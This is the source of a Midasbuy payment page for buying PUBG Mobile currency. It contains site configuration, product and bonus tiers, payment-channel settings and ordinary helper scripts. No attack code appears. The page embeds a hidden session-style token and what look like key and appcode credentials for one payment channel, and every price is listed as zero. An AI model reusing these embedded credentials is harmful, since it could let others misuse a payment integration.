            "cookieP3": "These cookies are used to measure and analyse how the service is accessed, used, or is performing in order to provide you with a better   user experience and to maintain, operate and continually improve the service.",
            "cookieT": "YOUR COOKIE PREFERENCES",
            "cookieT2": "Necessary Cookies",
            "cookieT3": "Analytics Cookies",
            "copyright": "COPYRIGHT © PUBG CORPORATION. ALL RIGHTS RESERVED.",
            "cstips": "For customer service, please contact us via email help@midasbuy.com or Facebook inbox.",
            "cstips1": "For customer service ",
            "cstips2": "Please send email to help@midasbuy.com",
            "facebook": "Facebook",
            "feedback": "Feedback",
            "followFB": "Follow Midasbuy",
            "followUs": "Follow us on",
            "privacystatement": "Privacy Policy",
            "termofcookie": "Cookie Perferences",
            "termofservice": "Terms of Service"
        };
        var showWelcomeBack = 1
        // 获取红点变量 需要考虑控制台还没配置变量的情况 在header.ts中的红点逻辑需要做相应的控制
        var redPointConfigs = {
            "showRedPoint2Unlogin": false,
            "vipCenter": {
                "beforeElement": true,
                "show": true,
                "show2Unlogin": true,
                "version": "Tue, 19 Aug 2020 10:57:00 GMT+0800"
            }
        }
        var user = null
        var fbPixelId = "4122111147803299"
        var jumpHomePage = true;
        var bubblePopConfig = {
            "bubbleShow": true,
            "href": "https://www.midasbuy.com/midasbuy/{0}/event/register/pubgm?lan=en&from=__mds_buy_bubble",
            "promoteShow": true,
            "repalce": false
        }
        var vipcenterConfig = {
            "directLinks": {
                "earnValuesLink": "",
                "goToPurchaseLink": ""
            },
            "goToPurchaseLink": "",
            "helpcenterLink": "https://cdn.midasbuy.com/oversea_web/faq/vipfaq.html",
            "historyRange": "January 2019 - February 2021",
            "luckyDraw": {
                "eventLink": "/event/viplottery/mds",
                "eventValid": 1,
                "images": {
                    "frontBgImage": "https://cdn.midasbuy.com/images/drawbox.png",
                    "giftItems": ["https://cdn.midasbuy.com/images/price1.png", "https://cdn.midasbuy.com/images/price2.png", "https://cdn.midasbuy.com/images/price3.png"],
                    "mobileBgImage": "https://cdn.midasbuy.com/oversea_web/static/images/vip/pointdraw-b8661b4902.png",
                    "pcBgImage": "https://cdn.midasbuy.com/oversea_web/static/images/vip/pointdraw-b8661b4902.png"
                },
                "spend": "100"
            },
            "messageConfig": {
                "desc": "You have Loyalty Points that you can receive (For global users except for Vietname and Taiwan（China） and China Mainland).",
                "href": "./pubgm/verifyplayer",
                "needOpen": true,
                "needScroll": false
            },
            "showCurrent": true,
            "showHistorical": true,
            "showLuckyDraw": 1,
            "showVipEntrance": 1,
            "showVipFAQ": 1,
            "taskCenter": {
                "allow_channel": "os_credit_card:*",
                "appid": "1450027575",
                "checkin": "sign",
                "defaultChannel": "os_credit_card",
                "goPurcharseLink": "/buy/pubgm?from=taskcenter",
                "groupid": "TASK210408103117306",
                "notVipTaskIds": ["fbb619c35073eb49"],
                "taskList": {
                    "4c1a92fbce48be46": {
                        "isNotVipTask": false,
                        "isVipTask": true,
                        "transMapLanKey": "checkinweek"
                    },
                    "fbb619c35073eb49": {
                        "defaultChannel": "os_credit_card",
                        "hash": "cardmanage",
                        "isNotVipTask": true,
                        "isVipTask": true,
                        "joinTaskLink": "/usercenter",
                        "transMapLanKey": "bindCard"
                    }
                },
                "transMapLanKey": {
                    "0be7d83bb624df3e": "checkinday",
                    "4c1a92fbce48be46": "checkinweek",
                    "fbb619c35073eb49": "bindCard"
                }
            },
            "toastTimeout": 2000,
            "verifyPageCounter": 60
        };
    </script>
    <script type="text/javascript">
        var sdk_rules = [{
            rule: "^https:\\/\\/nearme\\.atlas\\.com\\/\\?.*",
            type: "url",
            url: "https://{env}.api.unipay.qq.com/h5/overseah5/views/oppo/result.html"
        }, {
            rule: "^gojek:.*",
            type: "scheme"
        }, {
            rule: "^intent:.*",
            type: "intent"
        }, {
            rule: "^weixin:.*",
            type: "scheme"
        }];
    </script>


    <style type="text/css">
        input::-ms-clear {
            display: none;
        }

        .footer ul {
            margin-right: 15px;
        }

        .clause-box-pop {
            display: none;
        }

        [v-cloak] {
            display: none !important;
        }
		@font-face {
			font-family:dinm;
			src:url(font/DINMITTELSCHRIFTSTD.eot);
			src:url(font/DINMITTELSCHRIFTSTD.eot?#iefix) format('embedded-opentype'),url(font/DINMITTELSCHRIFTSTD.woff) format('woff'),url(font/DINMITTELSCHRIFTSTD.ttf) format('truetype'),url(font/DINMITTELSCHRIFTSTD.svg#webfont34M5alKg) format('svg');
    </style>
    <script>

    </script>
    <script>
        jQuery.fn.placeholder = function() {
            var b = document.createElement("input"),
                c = "placeholder" in b;
            if (!c) {
                var a = jQuery(this);
                a.each(function() {
                    var f = jQuery(this),
                        k = f.attr("placeholder"),
                        h = 0,
                        d = f.outerHeight(),
                        g = f.outerWidth(),
                        j = jQuery('<span class="phTips">' + k + "</span>");
                    try {
                        h = f.css("padding-left").match(/\d*/i)[0] * 1
                    } catch (i) {
                        h = 5
                    }
                    j.css({
                        "margin-left": -(g - h),
                        "height": d,
                        "line-height": d + "px",
                        "position": "absolute",
                        "color": "#cecfc9",
                        "font-size": "12px"
                    });
                    j.click(function() {
                        f.focus()
                    });
                    if (f.val() != "") {
                        j.css({
                            display: "none"
                        })
                    } else {
                        j.css({
                            display: "inline"
                        })
                    }
                    j.insertAfter(f);
                    f.keydown(function(l) {
                        j.css({
                            display: "none"
                        })
                    });
                    f.keyup(function(l) {
                        if (jQuery(this).val() != "") {
                            j.css({
                                display: "none"
                            })
                        } else {
                            j.css({
                                display: "inline"
                            })
                        }
                    })
                })
            }
            return this
        };
    </script>
    <script type="text/javascript">
        var loadJS = function(d, s, id, src, callback) {
            if (!src) {
                return;
            }
            var js, fjs = d.getElementsByTagName(s)[0];
            if (d.getElementById(id)) return;
            js = d.createElement(s);
            js.id = id;
            js.src = src;
            js.onload = function() {
                callback && callback.onload && callback.onload(id);
            };
            js.onerror = function() {
                callback && callback.onerror && callback.onerror(id);
            }
            fjs.parentNode.insertBefore(js, fjs);
        };
        // scrollFun 不能被去掉或注释，注释了会导致 交易记录在移动端展示不全       
        function scrollFun() {
            var wInnerH = $(window).height(); // 设备窗口的高度（不会变）
            var bScrollH = $(document).height(); // 滚动条总高度
            var footerH = $('.have-pay-sec .footer').outerHeight();
            var footerHeight = $('.footer').outerHeight();
            var headerHeight = $('.header-box').outerHeight();
            if (wInnerH === bScrollH) {
                $('.pay-sec').addClass('pay-sec-flex');
                $('.pay-sec').show();
                $('.have-pay-sec .footer').show();
                $('.record .form-box-wrap-1 .form-box-warp').css('max-height', (wInnerH - headerHeight - 110) + 'px');
                $('.record .form-box-wrap-2 .form-box-warp').css('max-height', (wInnerH - headerHeight - 110) + 'px');
                if (
                    wInnerH -
                    ($('.special-box').offset() ? $('.special-box').offset().top : 0) -
                    $('.special-box').outerHeight() >
                    footerHeight + 16
                ) {
                    $('.special-foot .footer').show();
                } else {
                    $('.wrap').removeClass('special-foot');
                }
            } else {
                $('.record-detailt-pop .detailt-box').css('max-height', (wInnerH - headerHeight - 74) + 'px');
                $('.record .form-box-wrap-1 .form-box-warp').css('max-height', (wInnerH - headerHeight - 110) + 'px');
                $('.record .form-box-wrap-2 .form-box-warp').css('max-height', (wInnerH - headerHeight - 110) + 'px');
                $('.wrap').removeClass('special-foot');
            }
        }
        $(function() {
            setTimeout(function() {
                scrollFun();
            }, 0);
            window.addEventListener('resize', function() {
                scrollFun();
            });
            window.loadImages && window.loadImages();
        });
    </script>
    <script type="text/javascript">
        ! function() {
            "use strict";
            var r = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=";
            window.btoa || (window.btoa = function(t) {
                for (var o, e, n = String(t), a = 0, i = r, c = ""; n.charAt(0 | a) || (i = "=", a % 1); c += i.charAt(63 & o >> 8 - a % 1 * 8)) {
                    if ((e = n.charCodeAt(a += .75)) > 255) throw new Error("'btoa' failed: The string to be encoded contains characters outside of the Latin1 range.");
                    o = o << 8 | e
                }
                return c
            }), window.atob || (window.atob = function(t) {
                var o = String(t).replace(/[=]+$/, "");
                if (o.length % 4 == 1) throw new Error("'atob' failed: The string to be decoded is not correctly encoded.");
                for (var e, n, a = 0, i = 0, c = ""; n = o.charAt(i++); ~n && (e = a % 4 ? 64 * e + n : n, a++ % 4) ? c += String.fromCharCode(255 & e >> (-2 * a & 6)) : 0) n = r.indexOf(n);
                return c
            })
        }();
    </script>
    


    <script>
        var WebsiteHosts = ["pay.gpubgm.com", "www.midasbuy.com", "pay.pubgm.zing.vn", "nap.codm.360mobi.vn", "sandbox.midasbuy.com", "pay.kingdomcraftgame.com", "127.0.0.1", "localhost"];
    </script>

    <script>
        var throttle = function(func, wait, options) {
            var context, args, result;
            var timeout = null;
            var previous = 0;
            if (!options) {
                options = {}
            }
            var later = function() {
                previous = options.leading === false ? 0 : +new Date();
                timeout = null;
                result = func.apply(context, args);
                if (!timeout) {
                    context = args = null
                }
            };
            return function() {
                var now = +new Date();
                if (!previous && options.leading === false) {
                    previous = now
                }
                var remaining = wait - (now - previous);
                context = this;
                args = arguments;
                if (remaining <= 0 || remaining > wait) {
                    if (timeout) {
                        clearTimeout(timeout);
                        timeout = null
                    }
                    previous = now;
                    result = func.apply(context, args);
                    if (!timeout) {
                        context = args = null
                    }
                } else {
                    if (!timeout && options.trailing !== false) {
                        timeout = setTimeout(later, remaining)
                    }
                }
                return result
            }
        };
    </script>
</head>

<body>
    <input type="hidden" id="xMidasToken" value="d94a5ea8a787f69eedd98afa7eb29ff7435a9ce8508ffaad6d119ab8caac15c3f559b2c8cbeb137437cd9147ff66981c">
    <input type="hidden" id="xMidasVersion" value="1.0.1">
    <div class="wrap game-ticket game-wrap game_list have-pay-sec game-ticket-new ">
        <script type="text/javascript">
            var GAME_INFO = {
                "offer_name": "PUBG Mobile",
                "unit": "UnknownCash",
                "rate": "10",
                "count": "0",
                "country_code": "",
                "currency_type": "",
                "channel": [{
                    "id": "os_credit_card",
                    "name": "",
                    "key": "",
                    "appcode": "",
                    "service_id": "",
                    "pay_channel": {},
                    "is_show_tax": ""
                }, {
                    "id": "mol",
                    "name": "",
                    "key": "poSZb92qoFgpqavNyD6oifsRhbhNGz7C",
                    "appcode": "SRAHw9dTRiMSTvYq1g6RLIVuNwNqg27f",
                    "service_id": "",
                    "pay_channel": {},
                    "is_show_tax": ""
                }, {
                    "id": "midas_redeem",
                    "name": "",
                    "key": "",
                    "appcode": "",
                    "service_id": "",
                    "pay_channel": {},
                    "is_show_tax": ""
                }, {
                    "id": "redeem",
                    "name": "",
                    "key": "",
                    "appcode": "",
                    "service_id": "",
                    "pay_channel": {},
                    "is_show_tax": ""
                }, {
                    "id": "mol_zgoldcard",
                    "name": "",
                    "key": "",
                    "appcode": "",
                    "service_id": "",
                    "pay_channel": {},
                    "is_show_tax": ""
                }, {
                    "id": "mol_razerzvault",
                    "name": "",
                    "key": "",
                    "appcode": "",
                    "service_id": "",
                    "pay_channel": {},
                    "is_show_tax": ""
                }, {
                    "id": "os_credit_card_adyen",
                    "name": "",
                    "key": "",
                    "appcode": "",
                    "service_id": "",
                    "pay_channel": {},
                    "is_show_tax": ""
                }],
                "productid_list": [{
                    "id": "os_credit_card",
                    "productid_info": [{
                        "name": "60 Unknow Cash",
                        "product_detail": "",
                        "productid": "os_credit_card_OT_60",
                        "price": "0",
                        "num": "60",
                        "currency_type": "USD",
                        "country": "OT"
                    }, {
                        "name": "300 Unknow Cash",
                        "product_detail": "",
                        "productid": "os_credit_card_OT_300",
                        "price": "0",
                        "num": "300",
                        "currency_type": "USD",
                        "country": "OT"
                    }, {
                        "name": "600 Unknow Cash",
                        "product_detail": "",
                        "productid": "os_credit_card_OT_600",
                        "price": "0",
                        "num": "600",
                        "currency_type": "USD",
                        "country": "OT"
                    }, {
                        "name": "1500 Unknow Cash",
                        "product_detail": "",
                        "productid": "os_credit_card_OT_1500",
                        "price": "0",
                        "num": "1500",
                        "currency_type": "USD",
                        "country": "OT"
                    }, {
                        "name": "3000 Unknow Cash",
                        "product_detail": "",
                        "productid": "os_credit_card_OT_3000",
                        "price": "0",
                        "num": "3000",
                        "currency_type": "USD",
                        "country": "OT"
                    }, {
                        "name": "6000 Unknow Cash",
                        "product_detail": "",
                        "productid": "os_credit_card_OT_6000",
                        "price": "0",
                        "num": "6000",
                        "currency_type": "USD",
                        "country": "OT"
                    }]
                }, {
                    "id": "mol_zgoldcard",
                    "productid_info": [{
                        "name": "60 Unknown Cash",
                        "product_detail": "",
                        "productid": "mol_zgoldcard_OT_60",
                        "price": "0",
                        "num": "60",
                        "currency_type": "USD",
                        "country": "OT"
                    }, {
                        "name": "120 Unknown Cash",
                        "product_detail": "",
                        "productid": "mol_zgoldcard_OT_120",
                        "price": "0",
                        "num": "120",
                        "currency_type": "USD",
                        "country": "OT"
                    }, {
                        "name": "300 Unknown Cash",
                        "product_detail": "",
                        "productid": "mol_zgoldcard_OT_300",
                        "price": "0",
                        "num": "300",
                        "currency_type": "USD",
                        "country": "OT"
                    }, {
                        "name": "600 Unknown Cash",
                        "product_detail": "",
                        "productid": "mol_zgoldcard_OT_600",
                        "price": "0",
                        "num": "600",
                        "currency_type": "USD",
                        "country": "OT"
                    }, {
                        "name": "1200 Unknown Cash",
                        "product_detail": "",
                        "productid": "mol_zgoldcard_OT_1200",
                        "price": "0",
                        "num": "1200",
                        "currency_type": "USD",
                        "country": "OT"
                    }, {
                        "name": "1500 Unknown Cash",
                        "product_detail": "",
                        "productid": "mol_zgoldcard_OT_1500",
                        "price": "0",
                        "num": "1500",
                        "currency_type": "USD",
                        "country": "OT"
                    }, {
                        "name": "3000 Unknown Cash",
                        "product_detail": "",
                        "productid": "mol_zgoldcard_OT_3000",
                        "price": "0",
                        "num": "3000",
                        "currency_type": "USD",
                        "country": "OT"
                    }, {
                        "name": "6000 Unknown Cash",
                        "product_detail": "",
                        "productid": "mol_zgoldcard_OT_6000",
                        "price": "0",
                        "num": "6000",
                        "currency_type": "USD",
                        "country": "OT"
                    }]
                }, {
                    "id": "mol_razerzvault",
                    "productid_info": [{
                        "name": "60 Unknown Cash",
                        "product_detail": "",
                        "productid": "mol_razerzvault_OT_60",
                        "price": "0",
                        "num": "60",
                        "currency_type": "USD",
                        "country": "OT"
                    }, {
                        "name": "180 Unknown Cash",
                        "product_detail": "",
                        "productid": "mol_razerzvault_OT_180",
                        "price": "0",
                        "num": "180",
                        "currency_type": "USD",
                        "country": "OT"
                    }, {
                        "name": "600 Unknown Cash",
                        "product_detail": "",
                        "productid": "mol_razerzvault_OT_600",
                        "price": "0",
                        "num": "600",
                        "currency_type": "USD",
                        "country": "OT"
                    }, {
                        "name": "1500 Unknown Cash",
                        "product_detail": "",
                        "productid": "mol_razerzvault_OT_1500",
                        "price": "0",
                        "num": "1500",
                        "currency_type": "USD",
                        "country": "OT"
                    }, {
                        "name": "3000 Unknown Cash",
                        "product_detail": "",
                        "productid": "mol_razerzvault_OT_3000",
                        "price": "0",
                        "num": "3000",
                        "currency_type": "USD",
                        "country": "OT"
                    }, {
                        "name": "6000 Unknown Cash",
                        "product_detail": "",
                        "productid": "mol_razerzvault_OT_6000",
                        "price": "0",
                        "num": "6000",
                        "currency_type": "USD",
                        "country": "OT"
                    }]
                }],
                "mol_pin_show_info": [],
                "pmwall_card": {},
                "appmode": 0,
                "max_num": 0,
                "productid": "",
                "goodsname": "",
                "goodsdes": "",
                "unit_price": "",
                "pmwall_cc": "",
                "short_openid": "",
                "charac_name": "",
                "logic_world_list": "",
                "mycard_info": {},
                "openid": "",
                "adyen_svrtime": "",
                "adyen_url": "",
                "pass_is_buy": "",
                "last_login_time": "",
                "vgameappid": ""
            };
            var MP_INFO = {
                "buycurrency": {
                    "uptopresent_ot": {
                        "rule_item": [{
                            "present_item": [{
                                "num": "60",
                                "send_type": "2",
                                "send_rate": "0",
                                "send_num": "3",
                                "send_ext": "",
                                "product_item": []
                            }, {
                                "num": "120",
                                "send_type": "2",
                                "send_rate": "0",
                                "send_num": "8",
                                "send_ext": "",
                                "product_item": []
                            }, {
                                "num": "300",
                                "send_type": "2",
                                "send_rate": "0",
                                "send_num": "40",
                                "send_ext": "",
                                "product_item": []
                            }, {
                                "num": "600",
                                "send_type": "2",
                                "send_rate": "0",
                                "send_num": "90",
                                "send_ext": "",
                                "product_item": []
                            }, {
                                "num": "1200",
                                "send_type": "2",
                                "send_rate": "0",
                                "send_num": "260",
                                "send_ext": "",
                                "product_item": []
                            }, {
                                "num": "1500",
                                "send_type": "2",
                                "send_rate": "0",
                                "send_num": "375",
                                "send_ext": "",
                                "product_item": []
                            }, {
                                "num": "3000",
                                "send_type": "2",
                                "send_rate": "0",
                                "send_num": "1000",
                                "send_ext": "",
                                "product_item": []
                            }, {
                                "num": "6000",
                                "send_type": "2",
                                "send_rate": "0",
                                "send_num": "2400",
                                "send_ext": "",
                                "product_item": []
                            }],
                            "allow_channel": "mol:1003",
                            "currency_type": "*",
                            "currency_zone": "*",
                            "begin_time": "2020-01-14 17:00:00",
                            "end_time": "2022-07-17 23:59:59",
                            "rank_type": "range",
                            "is_limit": "no",
                            "desc": ""
                        }, {
                            "present_item": [{
                                "num": "60",
                                "send_type": "2",
                                "send_rate": "0",
                                "send_num": "3",
                                "send_ext": "",
                                "product_item": []
                            }, {
                                "num": "180",
                                "send_type": "2",
                                "send_rate": "0",
                                "send_num": "18",
                                "send_ext": "",
                                "product_item": []
                            }, {
                                "num": "600",
                                "send_type": "2",
                                "send_rate": "0",
                                "send_num": "90",
                                "send_ext": "",
                                "product_item": []
                            }, {
                                "num": "1500",
                                "send_type": "2",
                                "send_rate": "0",
                                "send_num": "375",
                                "send_ext": "",
                                "product_item": []
                            }, {
                                "num": "3000",
                                "send_type": "2",
                                "send_rate": "0",
                                "send_num": "1000",
                                "send_ext": "",
                                "product_item": []
                            }, {
                                "num": "6000",
                                "send_type": "2",
                                "send_rate": "0",
                                "send_num": "2400",
                                "send_ext": "",
                                "product_item": []
                            }],
                            "allow_channel": "mol:27,mol:1001",
                            "currency_type": "*",
                            "currency_zone": "*",
                            "begin_time": "2020-01-14 17:00:00",
                            "end_time": "2022-07-17 23:59:59",
                            "rank_type": "range",
                            "is_limit": "no",
                            "desc": ""
                        }, {
                            "present_item": [{
                                "num": "60",
                                "send_type": "2",
                                "send_rate": "0",
                                "send_num": "3",
                                "send_ext": "",
                                "product_item": []
                            }, {
                                "num": "300",
                                "send_type": "2",
                                "send_rate": "0",
                                "send_num": "40",
                                "send_ext": "",
                                "product_item": []
                            }, {
                                "num": "600",
                                "send_type": "2",
                                "send_rate": "0",
                                "send_num": "90",
                                "send_ext": "",
                                "product_item": []
                            }, {
                                "num": "1500",
                                "send_type": "2",
                                "send_rate": "0",
                                "send_num": "375",
                                "send_ext": "",
                                "product_item": []
                            }, {
                                "num": "3000",
                                "send_type": "2",
                                "send_rate": "0",
                                "send_num": "1000",
                                "send_ext": "",
                                "product_item": []
                            }, {
                                "num": "6000",
                                "send_type": "2",
                                "send_rate": "0",
                                "send_num": "2400",
                                "send_ext": "",
                                "product_item": []
                            }],
                            "allow_channel": "os_adyen:4,os_credit_card",
                            "currency_type": "*",
                            "currency_zone": "*",
                            "begin_time": "2020-01-14 17:00:00",
                            "end_time": "2022-07-17 23:59:59",
                            "rank_type": "range",
                            "is_limit": "no",
                            "desc": ""
                        }],
                        "title": "",
                        "rule_id": "utp200102220832287"
                    },
                    "uptopresent3": {
                        "rule_item": [{
                            "present_item": [{
                                "num": "1",
                                "send_type": "1",
                                "send_num": "0",
                                "send_rate": "5",
                                "send_ext": "限1次",
                                "product_item": []
                            }, {
                                "num": "61",
                                "send_type": "1",
                                "send_num": "0",
                                "send_rate": "7",
                                "send_ext": "限1次",
                                "product_item": []
                            }, {
                                "num": "301",
                                "send_type": "1",
                                "send_num": "0",
                                "send_rate": "10",
                                "send_ext": "限1次",
                                "product_item": []
                            }, {
                                "num": "601",
                                "send_type": "1",
                                "send_num": "0",
                                "send_rate": "12",
                                "send_ext": "限1次",
                                "product_item": []
                            }, {
                                "num": "1501",
                                "send_type": "1",
                                "send_num": "0",
                                "send_rate": "15",
                                "send_ext": "限1次",
                                "product_item": []
                            }, {
                                "num": "3001",
                                "send_type": "1",
                                "send_num": "0",
                                "send_rate": "18",
                                "send_ext": "限1次",
                                "product_item": []
                            }],
                            "allow_channel": "os_credit_card,os_adyen:4,os_adyen_local_pay:8,os_adyen_local_pay:7,os_adyen_local_pay:6",
                            "currency_type": "*",
                            "currency_zone": "*",
                            "begin_time": "2021-07-12 10:00:00",
                            "end_time": "2021-07-27 23:59:59",
                            "rank_type": "range",
                            "is_limit": "byday",
                            "desc": "1"
                        }, {
                            "present_item": [{
                                "num": "1",
                                "send_type": "1",
                                "send_num": "0",
                                "send_rate": "0",
                                "send_ext": "",
                                "product_item": []
                            }, {
                                "num": "61",
                                "send_type": "1",
                                "send_num": "0",
                                "send_rate": "0",
                                "send_ext": "",
                                "product_item": []
                            }, {
                                "num": "301",
                                "send_type": "1",
                                "send_num": "0",
                                "send_rate": "0",
                                "send_ext": "",
                                "product_item": []
                            }, {
                                "num": "601",
                                "send_type": "1",
                                "send_num": "0",
                                "send_rate": "0",
                                "send_ext": "",
                                "product_item": []
                            }, {
                                "num": "1501",
                                "send_type": "1",
                                "send_num": "0",
                                "send_rate": "0",
                                "send_ext": "",
                                "product_item": []
                            }, {
                                "num": "3001",
                                "send_type": "1",
                                "send_num": "0",
                                "send_rate": "0",
                                "send_ext": "",
                                "product_item": []
                            }],
                            "allow_channel": "os_credit_card,os_adyen:4,os_adyen_local_pay:8,os_adyen_local_pay:7,os_adyen_local_pay:6",
                            "currency_type": "*",
                            "currency_zone": "*",
                            "begin_time": "2021-07-12 10:00:00",
                            "end_time": "2021-07-27 23:59:59",
                            "rank_type": "range",
                            "is_limit": "no",
                            "desc": ""
                        }],
                        "title": "",
                        "rule_id": "utp210708155753801"
                    },
                    "ruleset_id": "DRM210713235900000290",
                    "mall_url": "",
                    "result_url": "",
                    "title": "",
                    "title_url": ""
                }
            };
            var CHANNEL_INFO = {
                "adyen_wechat": {
                    "channel": "adyen",
                    "cssObj": {
                        "height": 200,
                        "width": 200
                    },
                    "currencyType": ["CNY", "HKD", "USD"],
                    "icon_h5": "https://midas.gtimg.cn/overseaspay/images/adyen/wechat.png",
                    "icon_pc": "https://midas.gtimg.cn/overseaspay/images/adyen/wechat.png",
                    "icon_pc_2": "https://midas.gtimg.cn/overseaspay/images/adyen/wechat.png",
                    "isAdyen": 1,
                    "name": "Wechat",
                    "payParams": {
                        "channel": "adyen",
                        "newtab": 0,
                        "subchannel": "wechat",
                        "wf_info": "return_qrcode=true"
                    },
                    "pm": "os_adyen:2",
                    "return_qrcode": true
                },
                "codapay_kh_dcb": {
                    "channel": "codapay",
                    "currencyType": ["USD"],
                    "icon_h5": "https://midas.gtimg.cn/oversea_web/static/images/paybyMobile.jpg",
                    "icon_pc": "https://cdn.midasbuy.com/images/6ccfe06cc59956768bd3a7be8b0a4eed52ee26b.png",
                    "name": "Pay By Mobile",
                    "pm": "os_codapay:27",
                    "subchannel": "dcb"
                },
                "codapay_kh_wing": {
                    "channel": "codapay",
                    "currencyType": ["USD"],
                    "icon_h5": "https://midas.gtimg.cn/overseaspay/images/codapay/mo_cnl_wing_logo.jpg",
                    "icon_pc": "https://midas.gtimg.cn/overseaspay/images/codapay/pc_cnl_wing_logo.jpg",
                    "icon_pc_2": "https://midas.gtimg.cn/overseaspay/images/codapay/pc_cnl_wing_logo@2x.jpg",
                    "name": "WING",
                    "pm": "os_codapay:28",
                    "subchannel": "wing"
                },
                "midas_redeem": {
                    "currencyType": ["INR", "IDR", "USD", "TRY", "IQD", "KWD", "SAR", "BHD", "QAR", "AED", "OMR", "EGP", "LYD", "TND", "DZD", "MAD", "LAK", "MYR", "MMK", "PHP", "SGD", "THB"],
                    "icon_h5": "https://cdn.midasbuy.com/images/midas_redeeme1abadee.png",
                    "icon_pc": "https://cdn.midasbuy.com/images/midas_redeeme1abadee.png",
                    "name": "Voucher Code",
                    "pm": "redeem"
                },
                "mol_fpx": {
                    "channel": "mol_global",
                    "currencyType": ["AUD", "BRL", "IDR", "INR", "MYR", "NZD", "PHP", "SGD", "THB", "TWD", "USD", "VND"],
                    "icon_h5": "https://midas.gtimg.cn/oversea_web/static/images/FPX.png",
                    "icon_pc": "https://midas.gtimg.cn/oversea_web/static/images/FPX.png",
                    "name": "FPX",
                    "pm": "mol:12",
                    "subchannel": "mol_fpx"
                },
                "mol_gamesultan": {
                    "channel": "mol_global",
                    "currencyType": ["TRY", "EUR", "USD"],
                    "icon_h5": "",
                    "icon_pc": "",
                    "icon_pc_2": "",
                    "name": "gamesultan",
                    "pm": "mol:9",
                    "subchannel": "mol_gamesultan"
                },
                "mol_maybank2u": {
                    "channel": "mol_global",
                    "currencyType": ["AUD", "BRL", "IDR", "INR", "MYR", "NZD", "PHP", "SGD", "THB", "TWD", "USD", "VND"],
                    "icon_h5": "",
                    "icon_pc": "",
                    "icon_pc_2": "",
                    "name": "maybank2u",
                    "pm": "mol:13",
                    "subchannel": "mol_maybank2u"
                },
                "mol_molpaycreditcard": {
                    "channel": "mol_global",
                    "currencyType": ["AUD", "BRL", "IDR", "INR", "MYR", "NZD", "PHP", "SGD", "THB", "TWD", "USD", "VND"],
                    "icon_h5": "",
                    "icon_pc": "",
                    "icon_pc_2": "",
                    "name": "molpaycreditcard",
                    "pm": "mol:10",
                    "subchannel": "mol_molpaycreditcard"
                },
                "mol_paypal": {
                    "channel": "mol_global",
                    "currencyType": ["AUD", "BRL", "IDR", "INR", "MYR", "NZD", "PHP", "SGD", "THB", "TWD", "USD", "VND"],
                    "icon_h5": "",
                    "icon_pc": "",
                    "icon_pc_2": "",
                    "name": "paypal",
                    "pm": "mol:11",
                    "subchannel": "mol_paypal"
                },
                "mol_razerzvault": {
                    "channel": "mol_global",
                    "currencyType": ["AUD", "BRL", "EUR", "HKD", "IDR", "INR", "MYR", "NZD", "PHP", "SGD", "THB", "TWD", "USD", "VND", "TRY", "MMK", "MXN", "HKD"],
                    "icon_h5": "https://midas.gtimg.cn/oversea_web/static/images/Razer_Gold.png",
                    "icon_pc": "https://midas.gtimg.cn/oversea_web/static/images/mol/razergold_logo.png",
                    "icon_pc_2": "",
                    "name": "Razer Gold ",
                    "pm": "mol:27",
                    "restoration": {
                        "endTime": "Thu Nov 19 2020 12:00:00 GMT+0800",
                        "startTime": "Thu Nov 05 2020 12:00:00 GMT+0800"
                    },
                    "subchannel": "mol_razerzvault"
                },
                "mol_rixty": {
                    "channel": "mol_global",
                    "currencyType": ["BRL", "USD"],
                    "icon_h5": "",
                    "icon_pc": "",
                    "icon_pc_2": "",
                    "name": "rixty",
                    "pm": "mol:1002",
                    "subchannel": "mol_rixty"
                },
                "mol_zgoldcard": {
                    "channel": "mol_global",
                    "currencyType": ["AUD", "BRL", "EUR", "HKD", "IDR", "INR", "MYR", "NZD", "PHP", "SGD", "THB", "TWD", "USD", "VND", "MXN", "TRY", "MMK", "HKD"],
                    "icon_h5": "https://midas.gtimg.cn/oversea_web/static/images/mol/razergold_logo.png",
                    "icon_pc": "https://midas.gtimg.cn/oversea_web/static/images/mol/razergold_logo.png",
                    "name": "Razer Gold Pin",
                    "pm": "mol:1003",
                    "subchannel": "mol_zgoldcard",
                    "type": "cashcard"
                },
                "mol_zgoldewallet": {
                    "channel": "mol_global",
                    "currencyType": ["AUD", "BRL", "EUR", "HKD", "IDR", "INR", "MYR", "NZD", "PHP", "SGD", "THB", "TWD", "USD", "MXN", "VND"],
                    "icon_h5": "https://midas.gtimg.cn/overseaspay/images/mol_global/mo_cnl_zgold_molpoints.png",
                    "icon_pc": "https://midas.gtimg.cn/overseaspay/images/mol_global/pc_cnl_zgold_molpoints.png",
                    "icon_pc_2": "https://midas.gtimg.cn/overseaspay/images/mol_global/pc_cnl_zgold_molpoints@2x.png",
                    "name": "e-Wallet",
                    "pm": "mol:1001",
                    "subchannel": "mol_zgoldewallet"
                },
                "os_boacompra": {
                    "channel": "boacompra",
                    "currencyType": ["BRL", "TRY", "MXN", "USD"],
                    "icon_h5": "https://cdn.midasbuy.com/images/os_boacompraa8dea1d5.png",
                    "icon_pc": "https://cdn.midasbuy.com/images/os_boacompraa8dea1d5.png",
                    "name": "Boacompra",
                    "pm": "os_boacompra",
                    "subchannel": ""
                },
                "os_boacompra_card": {
                    "channel": "boacompra",
                    "currencyType": ["BRL", "MXN", "TRY", "USD"],
                    "icon_h5": "https://cdn.midasbuy.com/images/os_boacompraa8dea1d5.png",
                    "icon_pc": "https://cdn.midasbuy.com/images/os_boacompraa8dea1d5.png",
                    "imgs": ["https://midas.gtimg.cn/boacompra/credit_card/visa.png", "https://midas.gtimg.cn/boacompra/credit_card/mastercard.png", "https://midas.gtimg.cn/boacompra/credit_card/americanexpress.png", "https://midas.gtimg.cn/boacompra/credit_card/visaelectron.png", "https://midas.gtimg.cn/boacompra/credit_card/diners.png", "https://midas.gtimg.cn/boacompra/credit_card/hipercard.png", "https://midas.gtimg.cn/boacompra/credit_card/aura.png", "https://midas.gtimg.cn/boacompra/credit_card/elocard.png", "https://midas.gtimg.cn/boacompra/credit_card/personal.png", {
                        "mx": ["https://midas.gtimg.cn/store_config/1599471336824UvemwojK.png", "https://midas.gtimg.cn/store_config/1599471350879ezAGOlbO.png", "https://midas.gtimg.cn/store_config/1599471367380rtokLPZy.png"],
                        "tr": ["https://midas.gtimg.cn/boacompra/credit_card/visa.png", "https://midas.gtimg.cn/boacompra/credit_card/mastercard.png", "https://midas.gtimg.cn/boacompra/credit_card/visaelectron.png", "https://midas.gtimg.cn/boacompra/credit_card/maestro.png"]
                    }],
                    "name": "Card",
                    "payParams": {
                        "channel": "boacompra",
                        "payment_group": "card",
